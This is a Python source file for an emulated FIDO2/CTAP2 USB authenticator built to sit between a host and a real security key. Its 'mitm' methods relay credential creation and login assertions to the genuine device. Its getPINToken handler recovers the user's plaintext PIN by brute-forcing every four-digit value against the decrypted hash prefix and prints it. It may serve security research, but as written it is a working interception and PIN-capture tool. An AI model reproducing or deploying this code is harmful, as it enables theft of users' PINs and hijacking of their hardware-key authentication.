import struct
import cbor2
import secrets
from cryptography.hazmat.primitives.asymmetric import ec, rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from hashing import *
from client_lib import FIDOClient

class CTAPHIDHandler:
    """Handles CTAPHID protocol parsing and CTAP2 commands"""
    
    # CTAPHID Commands
    CMD_PING = 0x81
    CMD_MSG = 0x83
    CMD_LOCK = 0x84
    CMD_INIT = 0x86
    CMD_WINK = 0x88
    CMD_CBOR = 0x90
    CMD_CANCEL = 0x91
    
    # CTAPHID Errors
    ERR_INVALID_CMD = 0x01
    ERR_INVALID_PAR = 0x02
    ERR_INVALID_LEN = 0x03
    ERR_INVALID_SEQ = 0x04
    ERR_MSG_TIMEOUT = 0x05
    ERR_CHANNEL_BUSY = 0x06
    ERR_LOCK_REQUIRED = 0x0A
    ERR_INVALID_CHANNEL = 0x0B
    
    # CTAP2 Commands
    CTAP2_MAKE_CREDENTIAL = 0x01
    CTAP2_GET_ASSERTION = 0x02
    CTAP2_GET_INFO = 0x04
    CTAP2_CLIENT_PIN = 0x06
    CTAP2_RESET = 0x07
    CTAP2_GET_NEXT_ASSERTION = 0x08
    CTAP2_BIO_ENROLLMENT = 0x09
    CTAP2_CREDENTIAL_MANAGEMENT = 0x0A
    CTAP2_SELECTION = 0x0B
    
    
    # CTAP2 Error codes
    CTAP2_OK = 0x00
    CTAP2_ERR_INVALID_COMMAND = 0x01
    CTAP2_ERR_INVALID_PARAMETER = 0x02
    CTAP2_ERR_UNSUPPORTED_ALGORITHM = 0x26
    CTAP2_ERR_OPERATION_DENIED = 0x27
    CTAP2_ERR_INVALID_OPTION = 0x2C
    CTAP2_ERR_NO_CREDENTIALS = 0x2E
    CTAP2_ERR_PIN_AUTH_INVALID = 0x33
    CTAP2_ERR_PIN_NOT_SET = 0x35
    
    BROADCAST_CID = 0xFFFFFFFF
    
    REAL_PIN = b"1234"
    
    def __init__(self, aaguid):
        self.next_cid = 0x01000000
        self.aaguid = aaguid
        self.pending_packets = {}  # For multi-packet messages
        self.credentials = {}
        self.pin_priv = None
        self.current_pin_token = None
        self.client = FIDOClient()

        self.info = {
            0x01: ["U2F_V2", "FIDO_2_0", "FIDO_2_1_PRE"],  # versions
            0x02: ["credProtect", "hmac-secret"],  # extensions
            0x03: self.aaguid,  # aaguid

            # Normal 4: {'rk': True, 'up': True, 'plat': False, 'clientPin': True, 'credentialMgmtPreview': True}

            0x04: {  # options
                "rk": True,  # resident key
                "up": True,  # user presence
                "plat": False,  # platform device
                "clientPin": True,  # client PIN set
                "credentialMgmtPreview": True, # Allow editing of stored credentials
            },
            0x05: 1024,  # maxMsgSize
            0x06: [1],  # pinUvAuthProtocols
            0x07: 6,  # maxCredentialCountInList
            0x08: 96,  # maxCredentialIdLength
            0x09: ["usb"],  # transports (other are "ble" and "nfc" )
            0x0A: [{"alg": -7, "type": "public-key"}, {"alg": -257, "type": "public-key"}],  # algorithms (ES256 - EC P-256 & SHA2-256, RS256 - RSA 2048 & SHA2-256)
        }        

    def parse_ctaphid_packet(self, data: bytes):
        """Parse a single 64-byte CTAPHID packet"""
        # Strip report ID if present (first byte)
        if len(data) == 65 and data[0] == 0x00:
            data = data[1:]
        
        if len(data) != 64:
            print(f"    ⚠️ Invalid packet size: {len(data)}")
            return None
            
        cid = struct.unpack('>I', data[0:4])[0]
        cmd_byte = data[4]
        
        # Check if initialization packet (bit 7 set) or continuation
        if cmd_byte & 0x80:
            # Initialization packet - keep the full command byte (including bit 7)
            cmd = cmd_byte  # Don't mask off bit 7 for the command value
            bcnt = struct.unpack('>H', data[5:7])[0]
            payload = data[7:7+min(bcnt, 57)]
                        
            if bcnt > 57:
                # Multi-packet message
                self.pending_packets[cid] = {
                    'cmd': cmd,
                    'total_len': bcnt,
                    'received': len(payload),
                    'data': bytearray(payload),
                    'seq': 0
                }
                return None  # Wait for continuation packets
            else:
                return (cid, cmd, payload)
        else:
            # Continuation packet
            seq = cmd_byte & 0x7F
            payload = data[5:]
            
            if cid not in self.pending_packets:
                print(f"    ⚠️ Continuation packet for unknown CID: {cid:08x}")
                return None
                
            pending = self.pending_packets[cid]
            
            if seq != pending['seq']:
                print(f"    ⚠️ Sequence mismatch: expected {pending['seq']}, got {seq}")
                del self.pending_packets[cid]
                return None
            
            remaining = pending['total_len'] - pending['received']
            chunk = payload[:remaining]
            pending['data'].extend(chunk)
            pending['received'] += len(chunk)
            pending['seq'] += 1
            
            print(f"    📦 Cont packet: CID={cid:08x}, SEQ={seq}, Progress={pending['received']}/{pending['total_len']}")
            
            if pending['received'] >= pending['total_len']:
                # Complete message received
                result = (cid, pending['cmd'], bytes(pending['data']))
                del self.pending_packets[cid]
                return result
            
            return None
    
    def create_ctaphid_response(self, cid: int, cmd: int, data: bytes):
        """Create CTAPHID response packets (handles fragmentation)"""
        packets = []
        data_len = len(data)
        
        # First packet (initialization)
        packet = bytearray(64)
        struct.pack_into('>I', packet, 0, cid)
        packet[4] = cmd
        struct.pack_into('>H', packet, 5, data_len)
        
        first_chunk_size = min(data_len, 57)
        packet[7:7+first_chunk_size] = data[:first_chunk_size]
        packets.append(bytes(packet))
        
        # Continuation packets if needed
        offset = first_chunk_size
        seq = 0
        
        while offset < data_len:
            packet = bytearray(64)
            struct.pack_into('>I', packet, 0, cid)
            packet[4] = seq
            
            chunk_size = min(data_len - offset, 59)
            packet[5:5+chunk_size] = data[offset:offset+chunk_size]
            packets.append(bytes(packet))
            
            offset += chunk_size
            seq += 1
        
        return packets
    
    def handle_init(self, cid: int, nonce: bytes):
        """Handle CTAPHID INIT command"""
        print(f"    INIT: CID={cid:08x}, Nonce={nonce.hex()}")
        
        if cid == self.BROADCAST_CID:
            # Allocate new channel
            new_cid = self.next_cid
            self.next_cid += 1
        else:
            new_cid = cid
        
        # Response: nonce (8) + CID (4) + protocol version (1) + major/minor/build (3) + capabilities (1)
        response = bytearray(nonce)  # Echo nonce
        response += struct.pack('>I', new_cid)
        response += bytes([2])  # Protocol version
        response += bytes([5, 3, 0])  # Device version 5.3.0 (was 1.0.1)
        response += bytes([0x04 | 0x01])  # Capabilities: CBOR (0x04) + WINK (0x01) = 0x05
        
        print(f"    ✅ INIT response: New CID={new_cid:08x}")
        return bytes(response)
    
    def handle_cbor(self, cid: int, cbor_data: bytes, real_fd):
        """Handle CTAPHID CBOR command (CTAP2)"""
        if not cbor_data:
            print("     ⚠️ Empty CBOR data")
            return bytes([self.ERR_INVALID_LEN])
        
        ctap_cmd = cbor_data[0]
        ctap_payload = cbor_data[1:] if len(cbor_data) > 1 else b''
        
        print(f"    🔧 CBOR: CTAP2 command={ctap_cmd:02x}")
        
        if ctap_cmd == self.CTAP2_GET_INFO:
            return self.handle_get_info()
        elif ctap_cmd == self.CTAP2_MAKE_CREDENTIAL:
            params = cbor2.loads(ctap_payload)
            rp = params.get(0x02)
            dummy_make = rp["id"] == ".dummy" or  rp["id"] == "make.me.blink"
            if real_fd is not None and not dummy_make:
                return self.mitm_make_credential(real_fd, ctap_payload)
                
            return self.handle_make_credential(ctap_payload)
        elif ctap_cmd == self.CTAP2_GET_ASSERTION:

            if real_fd is not None :
                return self.mitm_get_assertion(real_fd, ctap_payload)
                
            return self.handle_get_assertion(ctap_payload)
        elif ctap_cmd == self.CTAP2_CLIENT_PIN:
            return self.handle_client_pin(ctap_payload)
        elif ctap_cmd == self.CTAP2_RESET:
            return self.handle_reset(ctap_payload)
        else:
            print(f"⚠️ Unsupported CTAP2 command: {ctap_cmd:02x}")
            return bytes([self.CTAP2_ERR_INVALID_COMMAND])
        
    def handle_get_info(self):
        """Handle CTAP2 authenticatorGetInfo (0x04)"""
        print("     GetInfo request")
        
        # Encode info to CBOR
        cbor_response = cbor2.dumps(self.info)
        
        # CTAP2 success response: 0x00 + CBOR data
        response = bytes([0x00]) + cbor_response
        
        print(f"    ✅ GetInfo response: {len(response)} bytes")
        print(f"    CBOR hex: {cbor_response.hex()[:100]}...")
        
        return response
    
    def handle_make_credential(self, payload: bytes):
        """Handle CTAP2 authenticatorMakeCredential (0x01)"""
        print("     🔐 MakeCredential request")
        params = cbor2.loads(payload)
        print(f"    MakeCredential params: {params}")

        clientDataHash = params.get(0x01)
        rp = params.get(0x02)
        user = params.get(0x03)
        pub_key_params = params.get(0x04)
        excludeList = params.get(0x05, [])
        options = params.get(0x07)
        pinAuth = params.get(0x08)
        pinProtocol = params.get(0x09)

        if options == None:
            options = {}

        # Basic validation
        if not isinstance(clientDataHash, (bytes, bytearray)) or len(clientDataHash) != 32:
            print("    ⚠️ clientDataHash missing or invalid (must be 32 bytes)")
            return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

        if not isinstance(rp, dict) or 'id' not in rp:
            print("    ⚠️ rp missing or invalid")
            return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

        if not isinstance(user, dict) or 'id' not in user:
            print("    ⚠️ user missing or invalid")
            return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

        user_presence = None

        if "up" in options.keys():
            if options["up"] == False:
                return bytes([self.CTAP2_ERR_INVALID_OPTION])
            print("     User Presence required")
            user_presence = False

        if self.info[0x04]["up"] == True:
            print("     User Presence enabled")
            user_presence = False

        if "uv" in options.keys() and options["uv"] == True:
            print("     User Verification required")
            user_presence = False

        pub_key_type = None

        for i in range(0, len(pub_key_params)):
            if pub_key_params[i] in self.info[0x0A]:
                pub_key_type = pub_key_params[i]
                break

        if pub_key_type == None:
            print("    ⚠️ Key pair algorithms not supported")
            return bytes([self.CTAP2_ERR_UNSUPPORTED_ALGORITHM])

        # If excludeList provided, check whether any credential in it matches an existing credential for this RP
        for ex in excludeList:
            if not isinstance(ex, dict):
                continue
            ex_id = ex.get('id')
            if ex_id in self.credentials:
                # There is already such a credential — spec says the authenticator should fail (user already registered)
                print("    ⚠️ excludeList matched existing credential -> operation denied")
                return bytes([self.CTAP2_ERR_OPERATION_DENIED])
            
        # Check if pinAuth is present AND not empty (b'' means "not present")
        if pinAuth and len(pinAuth) > 0:
            if pinProtocol is None or pinProtocol != 1:
                print(f"    ⚠️ Unsupported or missing pinProtocol: {pinProtocol}")
                return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

            if self.current_pin_token is None:
                print("    ⚠️ pinAuth supplied but no pin token available")
                return bytes([self.CTAP2_ERR_PIN_NOT_SET])

            if len(pinAuth) != 16:
                print(f"    ⚠️ pinAuth invalid length: {len(pinAuth)}")
                return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

            expected_hmac = hmac_data( self.current_pin_token, hashes.SHA256(), clientDataHash )[:16]

            if expected_hmac != pinAuth:
                print("    ❌ pinAuth mismatch -> operation denied")
                return bytes([self.CTAP2_ERR_OPERATION_DENIED])
            else:
                print("     PinAuth validated!!")
            pin_verified = True
        else:
            pin_verified = False
            
        if pin_verified:
            user_presence = True;
        else:
            if user_presence == False:
                input( "Press any key to authorize the authentication..." );
                user_presence = True

        # Compute rpIdHash (SHA-256 of rp.id)
        rp_id = rp['id']
        if isinstance(rp_id, str):
            rp_id_bytes = rp_id.encode('utf-8')
        else:
            rp_id_bytes = bytes(rp_id)
        rp_id_hash = hash_data( hashes.SHA256(), rp_id_bytes )

        if pub_key_type["alg"] == -7: # Generate new credential keypair (P-256)
            priv = ec.generate_private_key(ec.SECP256R1())
            pub = priv.public_key()
            pub_numbers = pub.public_numbers()
            x_int = pub_numbers.x
            y_int = pub_numbers.y

            x_bytes = x_int.to_bytes(32, byteorder='big')
            y_bytes = y_int.to_bytes(32, byteorder='big')

            # Build COSE public key (EC2) as per RFC8152 / WebAuthn
            # COSE Key labels: 1=kty, 3=alg, -1=crv, -2=x, -3=y
            # kty: 2 (EC2), alg: -7 (ES256), crv: 1 (P-256)
            cose_key = {
                1: 2,
                3: -7,
                -1: 1,
                -2: x_bytes,
                -3: y_bytes
            }
        elif pub_key_type["alg"] == -257: # Generate new credential keypair (RSA 2048)
            priv = rsa.generate_private_key( key_size=2048, public_exponent=65537 )
            pub = priv.public_key()
            n_int = pub.public_numbers().n
            e_int = pub.public_numbers().e

            e_bytes = e_int.to_bytes(4, byteorder='big')
            n_bytes = n_int.to_bytes(256, byteorder='big')

            # Build COSE public key (RSA) as per RFC9676 / WebAuthn
            # COSE Key labels: 1=kty, 3=alg, -1=n, -2=e
            # kty: 3 (RSA), alg: -257 (RS256)
            cose_key = {
                1: 3,
                3: -257,
                -1: n_bytes,
                -2: e_bytes
            }

        # Create credential id
        credential_id = secrets.token_bytes(32)  # 32 bytes, well within typical maxCredentialIdLength

        # Build attestedCredentialData:
        # AAGUID (16) | credIdLen(2) | credentialId | credentialPublicKey (CBOR)
        aaguid = self.aaguid
        if not isinstance(aaguid, (bytes, bytearray)) or len(aaguid) != 16:
            # If the instance aaguid is not 16 bytes, default to 16 zero bytes
            print( "Null AAGUID" )
            aaguid = bytes(16)

        cred_id_len = struct.pack('>H', len(credential_id))
        credential_public_key_cbor = cbor2.dumps(cose_key)

        attested_cred_data = bytearray()
        attested_cred_data += aaguid
        attested_cred_data += cred_id_len
        attested_cred_data += credential_id
        attested_cred_data += credential_public_key_cbor

        # Flags: attested credential data included (AT) (bit 6)

        flags = 0x40  # 0x40

        if user_presence:
            flags |= 0x01  # UP

        if pin_verified:
            flags |= 0x04  # UV

        # Signature counter (4 bytes) - start at 0
        sign_count = struct.pack('>I', 0)

        # authData = rpIdHash (32) + flags (1) + signCount (4) + attestedCredentialData
        auth_data = bytearray()
        auth_data += rp_id_hash
        auth_data += bytes([flags])
        auth_data += sign_count
        auth_data += attested_cred_data
        
        self.credentials[credential_id] = {
            "private_key": priv,
            "public_key_cose": cose_key,
            "rp_id": rp_id,
            "user": user,
            "sign_count": 0
        }

        # Build response map
        response_map = {
            0x01: "none",
            0x02: bytes(auth_data),
            0x03: {}
        }

        cbor_response = cbor2.dumps(response_map)
        print(f"    ✅ MakeCredential produced credential id {credential_id.hex()} (len={len(credential_id)})")
        print(f"    ✅ MakeCredential response: rp_id_hash={rp_id_hash.hex()}, flags={bytes([flags]).hex()}, aaguid={aaguid.hex()}, cose_key={cose_key}")
        return bytes([self.CTAP2_OK]) + cbor_response
    
    def mitm_make_credential(self, real_fd, ctap_payload):
        
        self.client.fd = real_fd

        ok = self.client.init_device()
        if not ok:
            return bytes([self.CTAP2_ERR_OPERATION_DENIED])
        
        params = cbor2.loads(ctap_payload)
        clientDataHash = params.get(0x01)
        rp = params.get(0x02)
        user = params.get(0x03)
        
        response = self.client.make_credential(rp, user, clientDataHash, auth=False)
        if response is None:
            return bytes([self.CTAP2_ERR_OPERATION_DENIED])

        parsed = self.client.parse_auth_data(response[2])
        
        user_id = user.get("id")
        if isinstance(user_id, str):
            user_id = user_id.encode('utf-8')
        elif isinstance(user_id, list):
            user_id = bytes(user_id)
        elif not isinstance(user_id, (bytes, bytearray)):
            user_id = bytes(user_id)
        
        # Store credential with CONSISTENT structure
        self.credentials[parsed["credentialId"]] = {
            "publicKey": parsed["publicKey"],
            "signCount": parsed["signCount"],
            "user": user_id,  # Store as bytes
            "rp_id": rp.get("id")
        }
        
        print(f"✅ Stored credential: {parsed['credentialId'].hex()[:32]}...")
        print(f"   User ID: {user_id.hex() if isinstance(user_id, bytes) else user_id}")

        # Add pinAuth to response if we have a token
        if self.current_pin_token:
            pin_auth = hmac_data( self.current_pin_token, hashes.SHA256(), clientDataHash )[:16]
            response[8] = pin_auth
            response[9] = 1

        return bytes([self.CTAP2_OK]) + cbor2.dumps(response)

    def handle_get_assertion(self, payload: bytes):
        """Handle CTAP2 authenticatorGetAssertion (0x02)"""
        print("     🔑 GetAssertion request")
        params = cbor2.loads(payload)
        print(f"    GetAssertion params: {params}")

        rp_id = params.get(0x01)
        clientDataHash = params.get(0x02)
        allow_list = params.get(0x03)
        pinAuth = params.get(0x06)
        pinProtocol = params.get(0x07)

        if clientDataHash is None or len(clientDataHash) != 32:
            print("    ⚠️ Missing or invalid clientDataHash")
            return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

        user_verified = False
        
        if pinAuth and len(pinAuth) > 0:
            if pinProtocol is None or pinProtocol != 1:
                print(f"    ⚠️ Unsupported or missing pinProtocol: {pinProtocol}")
                return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

            if self.current_pin_token is None:
                print("    ⚠️ pinAuth supplied but no pin token available")
                return bytes([self.CTAP2_ERR_PIN_NOT_SET])

            if len(pinAuth) != 16:
                print(f"    ⚠️ pinAuth invalid length: {len(pinAuth)}")
                return bytes([self.CTAP2_ERR_INVALID_PARAMETER])

            expected_hmac = hmac_data( self.current_pin_token, hashes.SHA256(), clientDataHash )[:16]

            if expected_hmac != pinAuth:
                print("    ❌ pinAuth mismatch -> operation denied")
                return bytes([self.CTAP2_ERR_OPERATION_DENIED])
            else:
                print("     PinAuth validated!!")
                user_verified = True

        if not self.credentials:
            print("    ⚠️ No credentials stored")
            return bytes([self.CTAP2_ERR_NO_CREDENTIALS])
        
        if allow_list:
            cred_id = allow_list[0].get("id")
        else:
            cred_id = next(iter(self.credentials.keys()), None)

        cred = self.credentials.get(cred_id)

        if cred == None:
            return bytes([self.CTAP2_ERR_NO_CREDENTIALS])

        print(f"    Using credential ID: {cred}")

        if self.info[0x04]["up"] == True and user_verified == False:
            input( "Press any key to authorize the authentication..." );
            user_verified = True

        # Step 3: Build authenticatorData
        rp_id_hash = hash_data( hashes.SHA256(), rp_id.encode() )
        flags = 0x01  # UP
        if user_verified:
            flags |= 0x04  # UV bit

        cred["sign_count"] += 1
        sign_count = struct.pack(">I", cred["sign_count"])

        authData = rp_id_hash + bytes([flags]) + sign_count

        # Step 4: Sign (authData || clientDataHash)
        private_key = cred["private_key"]
        to_sign = authData + clientDataHash

        if cred["public_key_cose"][1] == 2: # EC
            signature_der = private_key.sign(to_sign, ec.ECDSA(hashes.SHA256()))
        elif cred["public_key_cose"][1] == 3: # RSA
            signature_der = private_key.sign(to_sign, padding.PKCS1v15(), hashes.SHA256()) 

        # Step 5: Response
        response = {
            0x01: {"id": cred_id, "type": "public-key"},
            0x02: authData,
            0x03: signature_der,
        }

        if user_verified:
            response[0x04] = {"id": cred["user"]["id"]}
        response[0x05] = 1 
        
        print(f"    ✅ Assertion generated (UV={user_verified})")
        print(response)
        return bytes([self.CTAP2_OK]) + cbor2.dumps(response)

    def mitm_get_assertion(self, real_fd, ctap_payload: bytes):
       
        params = cbor2.loads(ctap_payload)
        
        rp_id = params.get(0x01)
        clientDataHash = params.get(0x02)
        allow_list = params.get(0x03, [])

        # Normalize rpId to string
        if not isinstance(rp_id, str):
            if isinstance(rp_id, (bytes, bytearray)):
                rp_id = rp_id.decode('utf-8')
            else:
                rp_id = str(rp_id)

        if not isinstance(clientDataHash, (bytes, bytearray)):
            clientDataHash = bytes(clientDataHash)

        print(f"🔍 GetAssertion for RP: {rp_id}")

        if not allow_list:
            return bytes([self.CTAP2_ERR_NO_CREDENTIALS])

        cred_entry = allow_list[0]
        cred_id = cred_entry.get("id")
        
        # Normalize credential ID to bytes
        if isinstance(cred_id, list):
            cred_id = bytes(cred_id)
        elif isinstance(cred_id, str):
            cred_id = cred_id.encode('utf-8')
        elif not isinstance(cred_id, (bytes, bytearray)):
            cred_id = bytes(cred_id)
        
        print(f"🔑 Looking up credential: {cred_id.hex()[:32]}...")
        print(f"📋 Available credentials: {[k.hex()[:32] for k in self.credentials.keys()]}")

        # if cred_id not in self.credentials:
        #     print("❌ Unknown credential")
        #     return bytes([self.CTAP2_ERR_NO_CREDENTIALS])

        # cred = self.credentials[cred_id]
        # print(f"✅ Found credential")

        # cred_entry["publicKey"] = cred["publicKey"]

        self.client.fd = real_fd
        if not self.client.init_device():
            return bytes([self.CTAP2_ERR_OPERATION_DENIED])

        print("➡️ Forwarding GetAssertion to real device...")
        response = self.client.get_assertion(rp_id, cred_entry, clientDataHash, auth=False)

        if response is None:
            print("❌ get_assertion returned None")
            return bytes([self.CTAP2_ERR_OPERATION_DENIED])

        authData = response.get(2)
        signature = response.get(3)

        if isinstance(authData, list):
            authData = bytes(authData)
       
        if isinstance(signature, list):
            signature = bytes(signature)
     
        if isinstance(cred_id, (bytes, bytearray)):
            response_cred_id = cred_id
        else:
            response_cred_id = bytes(cred_id)

        reply = {
            0x01: {                          # credential
                "id": response_cred_id,
                "type": "public-key"
            },
            0x02: authData,                  # authenticatorData
            0x03: signature,                 # signature
            # 0x04: {"id": cred["user"]},      # user (if UV flag set)
        }

        print("✅ MITM Assertion built successfully")
        return bytes([self.CTAP2_OK]) + cbor2.dumps(reply)

    def handle_client_pin(self, payload: bytes):
        """Handle CTAP2 authenticatorClientPIN (0x06)"""
        print("🔐 ClientPIN request")
        
        try:
            if payload:
                params = cbor2.loads(payload)
                print(f"    ClientPIN params: {params}")
                
                pinUvAuthProtocol = params.get(0x01)  # Which protocol (1 or 2)
                subCommand = params.get(0x02)  # What operation
                
                print(f"    Protocol: {pinUvAuthProtocol}, SubCommand: {subCommand}")
                
                if subCommand == 0x01:  # getRetries
                    print("    -> getRetries")
                    response = {
                        0x03: 2,  # 8 PIN attempts remaining
                    }
                    return bytes([self.CTAP2_OK]) + cbor2.dumps(response)
                    
                elif subCommand == 0x02:  # getKeyAgreement  
                    print("    -> getKeyAgreement")

                    priv = ec.generate_private_key(ec.SECP256R1(), default_backend())
                    pub = priv.public_key()
                    pub_nums = pub.public_numbers()
                    x = pub_nums.x.to_bytes(32, "big")
                    y = pub_nums.y.to_bytes(32, "big")

                    # Store private key for subsequent getPINToken call
                    self.pin_priv = priv

                    
                    cose_key = {
                        1: 2,       # kty: EC2
                        3: -25,     # alg: ECDH-ES + HKDF-256
                        -1: 1,      # crv: P-256
                        -2: x,
                        -3: y
                    }

                    response_map = {1: cose_key}
                    cbor_response = cbor2.dumps(response_map)
                    response = bytes([0x00]) + cbor_response
                    print(f"    ✅ getKeyAgreement response ({len(response)} bytes)")
                    print(f"    CBOR: {cbor_response.hex()[:80]}...")

                    return response
                    
                elif subCommand == 0x03:  # setPIN
                    print("    -> setPIN (not implemented)")
                    return bytes([self.CTAP2_OK])
                    
                elif subCommand == 0x04:  # changePIN
                    print("    -> changePIN")
                    return bytes([self.CTAP2_ERR_PIN_NOT_SET])
                    
                elif subCommand == 0x05:  # getPINToken (deprecated)
                    print("    -> getPINToken (deprecated)")

                    cli_public = params.get(0x03) 
                    cli_x = cli_public.get(-2)
                    cli_y = cli_public.get(-3)
                    enc_pin_blob = params.get(0x06) 

                    if len(enc_pin_blob) < 16 or (len(enc_pin_blob) - 16) % 16 != 0:
                        print("    ⚠️ enc_pin_blob length invalid")
                        return bytes([self.CTAP2_ERR_INVALID_PARAMETER])
                    
                    try:
                        cli_x_int = int.from_bytes(cli_x, "big")
                        cli_y_int = int.from_bytes(cli_y, "big")
                        client_pub_numbers = ec.EllipticCurvePublicNumbers(cli_x_int, cli_y_int, ec.SECP256R1())
                        client_pub = client_pub_numbers.public_key(default_backend())
                    except Exception as e:
                        print(f"    ⚠️ Unable to build client public key: {e}")
                        return bytes([self.CTAP2_ERR_INVALID_PARAMETER])
                    
                    shared = self.pin_priv.exchange(ec.ECDH(), client_pub)
                    shared_key = hash_data( hashes.SHA256(), shared )

                    cipher = Cipher(algorithms.AES(shared_key), modes.ECB(), backend=default_backend())
                    decryptor = cipher.decryptor()
                    decrypted = decryptor.update(enc_pin_blob) + decryptor.finalize()
                    
                    received_pin_hash_prefix = decrypted[:16]

                    # expected_pin_hash_prefix = hash_data( hashes.SHA256(), self.REAL_PIN )[:16]

                    pin_found = False
                    for i in range(1, 10000):  
                        pin_candidate = str(i).zfill(4) 
                        expected_pin_hash_prefix = hash_data( hashes.SHA256(), pin_candidate.encode() )[:16]
                        
                        if received_pin_hash_prefix == expected_pin_hash_prefix:
                            print(f"    ✅ Inputted PIN : {pin_candidate}")
                            pin_found = True
                            break

                    if not pin_found:
                        print("    ❌ PIN hash mismatch -> operation denied")
                        return bytes([self.CTAP2_ERR_OPERATION_DENIED])

                    
                    print(f"    PIN verified and Shared Key sucessfully found!!")

                    pin_token = secrets.token_bytes(32)
                    zero_iv = b"\x00" * 16
                    self.current_pin_token = pin_token  

                    cipher = Cipher(algorithms.AES(shared_key), modes.CBC(zero_iv), backend=default_backend())
                    encryptor = cipher.encryptor()
                    pin_token_enc = encryptor.update(pin_token) + encryptor.finalize()

                    response_map = {0x02: pin_token_enc}
                    cbor_response = cbor2.dumps(response_map)
                    
                    print(f"    🔐 Returning encrypted PIN token ({len(pin_token_enc)} bytes)")
                    return bytes([self.CTAP2_OK]) + cbor_response
                
                elif subCommand == 0x06:  # getPinUvAuthTokenUsingUvWithPermissions
                    print("    -> getPinUvAuthTokenUsingUvWithPermissions")
                    return bytes([self.CTAP2_ERR_PIN_NOT_SET])
                    
                elif subCommand == 0x07:  # getUVRetries
                    print("    -> getUVRetries")
                    response = {
                        0x05: 5,  # 5 UV attempts remaining
                    }
                    return bytes([self.CTAP2_OK]) + cbor2.dumps(response)
                    
                    
                elif subCommand == 0x08:  # getPinUvAuthTokenUsingPinWithPermissions
                    print("    -> getPinUvAuthTokenUsingPinWithPermissions")
                    return bytes([self.CTAP2_ERR_PIN_NOT_SET])
                    
                else:
                    print(f"    -> Unknown subCommand: {subCommand}")
                    return bytes([self.CTAP2_ERR_INVALID_PARAMETER])
            
            # No payload - invalid
            return bytes([self.CTAP2_ERR_INVALID_PARAMETER])
            
        except Exception as e:
            print(f"    ClientPIN error: {e}")
            import traceback
            traceback.print_exc()
            return bytes([self.CTAP2_ERR_INVALID_PARAMETER])
    
    def handle_reset(self, payload: bytes):
        print("     authenticatorReset request")
        self.credentials={}
        self.pending_packets = {} 
        self.pin_priv = None
        self.current_pin_token = None
        return bytes([self.CTAP2_OK]) 

    def handle_ping(self, cid: int, data: bytes):
        """Handle CTAPHID PING command"""
        print(f"    🏓 PING: {len(data)} bytes")
        return data  # Echo back

    def handle_msg(self, cid: int, data: bytes):
        print(f"    MSG: {len(data)} bytes")
        return data

    def handle_command(self, cid: int, cmd: int, data: bytes, real_fd):

        """Dispatch CTAPHID command to appropriate handler"""
        print(f"    ⚙️ Handling CMD={cmd:02x}, CID={cid:08x}, Data length={len(data)}")
        
        if cmd == self.CMD_INIT:
            if len(data) < 8:
                print("     ⚠️ INIT: Invalid nonce length")
                return None
            response_data = self.handle_init(cid, data[:8])
            
        elif cmd == self.CMD_CBOR:
            response_data = self.handle_cbor(cid, data, real_fd)
            
        elif cmd == self.CMD_PING:
            response_data = self.handle_ping(cid, data)

        elif cmd == self.CMD_MSG:
            response_data = self.handle_msg(cid, data)
            
        else:
            print(f"    ⚠️ Unsupported command: {cmd:02x}")
            response_data = bytes([self.ERR_INVALID_CMD])
        
        return self.create_ctaphid_response(cid, cmd, response_data)
    
